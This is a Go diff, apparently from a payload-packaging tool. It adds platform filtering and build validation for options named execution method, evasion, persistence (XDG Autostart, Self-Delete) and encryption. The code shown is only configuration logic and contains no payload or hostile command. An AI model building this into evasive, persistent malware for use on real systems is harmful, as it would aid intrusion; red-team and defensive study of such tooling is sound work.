@@ -68,3 +68,117 @@ var persistPlatform = map[int]int{
 	2: PlatLin, // XDG Autostart
 	3: PlatWin, // Self-Delete
 }
+
+// requiresWindows returns true if any Windows-only option is selected
+func (cfg *PackageConfig) requiresWindows() bool {
+	if plat, ok := execMethodPlatform[cfg.ExecMethod]; ok && plat == PlatWin {
+		return true
+	}
+	for i, on := range cfg.Evasion {
+		if on {
+			if plat, ok := evasionPlatform[i]; ok && plat == PlatWin {
+				return true
+			}
+		}
+	}
+	if cfg.PersistMethod == 1 || cfg.PersistMethod == 3 {
+		return true
+	}
+	return false
+}
+
+// requiresLinux returns true if any Linux-only option is selected
+func (cfg *PackageConfig) requiresLinux() bool {
+	return cfg.PersistMethod == 2 // XDG Autostart
+}
+
+// FilteredOptions holds options applicable to a specific platform
+type FilteredOptions struct {
+	ExecMethod int
+	Evasion    []bool
+	Persist    int
+	Encrypt    bool
+}
+
+// optionsForTarget returns only the options applicable to the given target
+func optionsForTarget(target string, cfg *PackageConfig) FilteredOptions {
+	plat := PlatLin
+	if target == "windows" {
+		plat = PlatWin
+	}
+
+	result := FilteredOptions{
+		Encrypt: cfg.Encrypt,
+	}
+
+	// Filter exec method
+	if p, ok := execMethodPlatform[cfg.ExecMethod]; ok && (p&plat) != 0 {
+		result.ExecMethod = cfg.ExecMethod
+	}
+
+	// Filter evasion
+	result.Evasion = make([]bool, len(cfg.Evasion))
+	for i, on := range cfg.Evasion {
+		if on {
+			if p, ok := evasionPlatform[i]; ok && (p&plat) != 0 {
+				result.Evasion[i] = true
+			}
+		}
+	}
+
+	// Filter persistence
+	if p, ok := persistPlatform[cfg.PersistMethod]; ok && (p&plat) != 0 {
+		result.Persist = cfg.PersistMethod
+	}
+
+	return result
+}
+
+// ValidationResult holds validation outcome
+type ValidationResult struct {
+	Valid          bool
+	Error          string   // blocking error message
+	MissingWindows bool     // Windows options selected but no Windows target
+	MissingLinux   bool     // Linux options selected but no Linux target
+	SkippedOptions []string // options that will be skipped
+}
+
+// ValidateBuild checks if a build job is valid
+func ValidateBuild(targets []string, asset string, embedMode bool, cfg *PackageConfig) *ValidationResult {
+	result := &ValidationResult{Valid: true}
+
+	// Check targets
+	if len(targets) == 0 {
+		result.Valid = false
+		result.Error = "Select at least one target"
+		return result
+	}
+
+	// Check asset in embed mode
+	if embedMode && asset == "" {
+		result.Valid = false
+		result.Error = "Select an asset first"
+		return result
+	}
+
+	// Check platform mismatches
+	hasWindows := false
+	hasLinux := false
+	for _, t := range targets {
+		if t == "windows" || t == "x86_64-pc-windows-gnu" {
+			hasWindows = true
+		}
+		if t == "linux" || t == "x86_64-unknown-linux-gnu" {
+			hasLinux = true
+		}
+	}
+
+	if cfg.requiresWindows() && !hasWindows {
+		result.MissingWindows = true
+	}
+	if cfg.requiresLinux() && !hasLinux {
+		result.MissingLinux = true
+	}
+
+	return result
+}
